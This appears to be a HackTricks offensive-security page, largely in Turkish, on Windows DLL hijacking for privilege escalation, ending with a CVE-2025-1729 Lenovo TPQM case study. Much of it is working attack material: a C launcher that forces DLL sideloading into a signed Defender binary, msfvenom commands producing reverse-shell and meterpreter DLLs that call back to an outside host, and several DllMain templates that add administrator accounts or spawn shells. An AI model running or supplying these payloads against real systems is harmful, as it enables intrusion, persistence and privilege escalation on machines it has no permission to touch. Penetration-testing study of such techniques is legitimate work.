# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking, güvenilir bir uygulamanın kötü amaçlı bir DLL yükleyecek şekilde manipüle edilmesini içerir. Bu terim, **DLL Spoofing, Injection, and Side-Loading** gibi birkaç taktiği kapsar. Genellikle kod yürütme, persistence elde etme ve daha az yaygın olarak privilege escalation için kullanılır. Burada escalation üzerine odaklanılsa da, hijacking yöntemi hedeflere göre genelde aynıdır.

### Common Techniques

DLL hijacking için uygulamanın DLL yükleme stratejisine bağlı olarak farklı yöntemler kullanılır:

1. **DLL Replacement**: Gerçek bir DLL'i kötü amaçlı bir tane ile değiştirme; orijinal DLL işlevselliğini korumak için isteğe bağlı olarak DLL Proxying kullanılabilir.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'i, meşru olandan önce aranacak bir arama yoluna yerleştirerek uygulamanın arama deseninden faydalanma.
3. **Phantom DLL Hijacking**: Uygulamanın yükleyeceğini düşündüğü, mevcut olmayan bir gerekli DLL için kötü amaçlı bir DLL oluşturma.
4. **DLL Redirection**: `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi arama parametrelerini değiştirerek uygulamayı kötü amaçlı DLL'e yönlendirme.
5. **WinSxS DLL Replacement**: WinSxS dizinindeki meşru DLL'i kötü amaçlı bir muadiliyle değiştirme; bu yöntem genellikle DLL side-loading ile ilişkilidir.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'i, kopyalanmış uygulamanın bulunduğu ve kullanıcının kontrolündeki bir dizine yerleştirerek Binary Proxy Execution tekniklerine benzeyen bir senaryo oluşturma.

## Finding missing Dlls

Sistemdeki eksik Dll'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filtreyi** ayarlamaktır:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

ve sadece **File System Activity**'yi gösterin:

![](<../../../images/image (153).png>)

Eğer genel olarak **eksik dlller** arıyorsanız, bunu birkaç **saniye** çalışır durumda bırakın.\
Eğer belirli bir executable içinde **eksik bir dll** arıyorsanız, **başka bir filtre** örneğin "Process Name" "contains" "\<exec name>" gibi ayarlamalı, çalıştırıp olay yakalamayı durdurmalısınız.

## Exploiting Missing Dlls

Privilege escalation için en iyi şansımız, bir privilege process'in yüklemeye çalışacağı bir dll'i, o dll'in aranacağı **yerlerden birine** yazabilmektir. Bu nedenle ya orijinal dll'in bulunduğu klasörden **daha önce aranacak** bir klasöre dll yazabileceğiz (tuhaf bir durum), ya da orijinal **dll'in hiçbir klasörde olmadığı** bir yerde dll'in aranacağı bir klasöre yazabileceğiz.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications**, DLL'leri belirli bir sıra izleyen ön tanımlı arama yolları setine göre arar. DLL hijacking sorunu, zararlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilip gerçek DLL'den önce yüklenmesini sağlamaya çalışıldığında ortaya çıkar. Bunu önlemenin bir çözümü, uygulamanın gerektirdiği DLL'leri belirtirken mutlak yollar kullanmasını sağlamaktır.

32-bit sistemlerdeki **DLL search order** aşağıdaki gibidir:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Bu, **SafeDllSearchMode** etkin haldeyken varsayılan arama sırasıdır. Bu özellik devre dışı bırakıldığında current directory ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry değerini oluşturun ve 0 olarak ayarlayın (varsayılan olarak etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği executable modülünün dizininden başlar.

Son olarak, bir dll bazen sadece adı yerine mutlak yol belirtilerek yüklenebilir. Bu durumda o dll **sadece o yolda** aranır (eğer dll'in bağımlılıkları varsa, onlar yüklendiği gibi isimle aranacaktır).

Arama sırasını değiştirecek başka yollar da vardır fakat bunları burada açıklamayacağım.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin ileri düzey bir yolu, ntdll'nin native API'leri ile process oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya saldırgan kontrollü bir dizin sağlanarak, hedef süreç bir import DLL'i isimle çözümlüyorsa (mutlak yol yok ve safe loading flag'leri kullanılmıyorsa), yükleyici bu dizinden kötü amaçlı bir DLL yüklemeye zorlanabilir.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Kötü amaçlı xmllite.dll (gerekli fonksiyonları export eden veya gerçek olan DLL'e proxy eden) dosyasını DllPath dizininize yerleştirin.
- Yukarıdaki teknikle xmllite.dll'i isimle aradığı bilinen imzalı bir binary'yi başlatın. Loader import'u sağlanan DllPath üzerinden çözer ve DLL'inizi sideloads eder.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Bir **hafızada zaten yüklü olan ile aynı ada sahip bir DLL** ile karşılaşıldığında, sistem normal aramayı atlar. Bunun yerine, varsayılan olarak hafızadaki DLL'e dönmeden önce yönlendirme (redirection) ve manifest için bir kontrol gerçekleştirir. **Bu senaryoda, sistem DLL için bir arama gerçekleştirmez**.
- Eğer DLL, mevcut Windows sürümü için bir **known DLL** olarak tanınıyorsa, sistem known DLL'in kendi sürümünü ve onun bağımlı DLL'lerini kullanır ve **arama sürecinden vazgeçer**. Kayıt defteri anahtarı **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bu known DLL'lerin bir listesini tutar.
- Eğer bir **DLL'in bağımlılıkları** varsa, bu bağımlı DLL'ler için yapılan arama, başlangıçtaki DLL tam bir yol ile tanımlanmış olsa bile, sanki sadece **modül isimleri** ile belirtilmişler gibi yürütülür.

### Escalating Privileges

**Requirements**:

- Farklı **privileges** (yatay veya lateral hareket) altında çalışan veya çalışacak ve **DLL eksikliği** olan bir process tespit edin.
- **DLL'in aranacağı** herhangi bir **dizin** için **write access**'inizin olduğundan emin olun. Bu konum executable'ın dizini veya system path içindeki bir dizin olabilir.

Evet, gereksinimleri bulmak karmaşıktır çünkü **varsayılan olarak yetkili bir executable'ın bir DLL eksik olması gariptir** ve **system path klasöründe yazma iznine sahip olmak daha da gariptir** (varsayılan olarak sahip olamazsınız). Ancak yanlış yapılandırılmış ortamlarda bu mümkün olabilir. Eğer şanslıysanız ve gereksinimleri karşılıyorsanız, [UACME](https://github.com/hfiref0x/UACME) projesine göz atabilirsiniz. Projenin **ana hedefi UAC'yi bypass etmek** olsa bile, kullanabileceğiniz Windows sürümü için bir **PoC** of a Dll hijaking orada bulabilirsiniz (muhtemelen sadece yazma izniniz olan klasörün yolunu değiştirerek).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ayrıca bir executable'ın imports'larını ve bir dll'in exports'larını şu komutla kontrol edebilirsiniz:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **Dll Hijacking'i kötüye kullanarak ayrıcalıkları yükseltme** ve **Sistem PATH klasörüne** yazma iznine sahip olduğunuz senaryolar için bakın:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) system PATH içindeki herhangi bir klasörde yazma izniniz olup olmadığını kontrol eder.\
Bu zafiyeti keşfetmek için ilginç diğer otomatik araçlar **PowerSploit functions**'tır: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._

### Örnek

Eğer kullanılabilir bir senaryo bulursanız, bunu başarıyla exploit etmek için en önemli noktalardan biri **çalıştırılabilir dosyanın bu dll'den import edeceği tüm fonksiyonları en azından export eden bir dll oluşturmak** olacaktır. Her halükarda, Dll Hijacking'in [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** gibi yükseltmelerde işe yaradığını unutmayın. Çalıştırma amaçlı dll hijacking'e odaklanan bu dll hijacking çalışmasında **geçerli bir dll nasıl oluşturulur** örneğini şu adreste bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Dahası, **sonraki bölü**mde bazı **temel dll kodları** bulabilirsiniz; bunlar **şablon** olarak veya **gereksiz fonksiyonları export eden bir dll** oluşturmak için faydalı olabilir.

## **Dll Oluşturma ve Derleme**

### **Dll Proxifying**

Temelde bir **Dll proxy**, yüklendiğinde **kötü amaçlı kodunuzu çalıştırabilen** ancak aynı zamanda **gerçek kütüphaneye yapılan tüm çağrıları ileterek** beklendiği gibi **görünmesini** ve **çalışmasını sağlayan** bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracı ile aslında **bir executable belirtip proxify etmek istediğiniz kütüphaneyi seçebilir** ve **proxified bir dll üretebilir** veya **Dll'i belirterek** **proxified bir dll oluşturabilirsiniz**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) alın:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluşturun (x86, x64 sürümünü görmedim):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi

Çoğu durumda derlediğiniz Dll'in, hedef işlem tarafından yüklenecek **export several functions**'ı içermesi gerektiğini unutmayın; bu fonksiyonlar yoksa **binary won't be able to load** them ve **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Vaka Analizi: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Ayrıcalık Yükseltme

Bu vaka, Lenovo'nun TrackPoint Quick Menu (`TPQMAssistant.exe`) uygulamasında **Phantom DLL Hijacking** örneğini gösterir; izlenen CVE kimliği **CVE-2025-1729**'dir.

### Zafiyet Detayları

- **Bileşen**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zamanlanmış Görev**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` giriş yapmış kullanıcının bağlamında her gün 09:30'da çalışır.
- **Dizin İzinleri**: `CREATOR OWNER` tarafından yazılabilir, yerel kullanıcıların keyfi dosyalar bırakmasına izin verir.
- **DLL Arama Davranışı**: Önce çalışma dizininden `hostfxr.dll` yüklemeye çalışır ve eksikse "NAME NOT FOUND" kaydı düşer; bu, yerel dizin aramasının öncelikli olduğunu gösterir.

### İstismar Uygulaması

Bir saldırgan aynı dizine kötü amaçlı bir `hostfxr.dll` stub koyarak, eksik DLL'i istismar edip kullanıcının bağlamında kod yürütmesi elde edebilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Standart bir kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` konumuna bırakın.
2. Zamanlanmış görevin mevcut kullanıcının bağlamında saat 09:30'da çalışmasını bekleyin.
3. Görev çalıştığında bir yönetici oturum açmışsa, kötü amaçlı DLL yönetici oturumunda medium integrity seviyesinde çalışır.
4. medium integrity'den SYSTEM privileges'a yükselmek için standart UAC bypass tekniklerini zincirleyin.

### Önlem

Lenovo, Microsoft Store üzerinden UWP sürümü **1.12.54.0**'ı yayınladı; bu sürüm TPQMAssistant'ı `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\` altına kurar, zafiyetli zamanlanmış görevi kaldırır ve eski Win32 bileşenlerini kaldırır.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
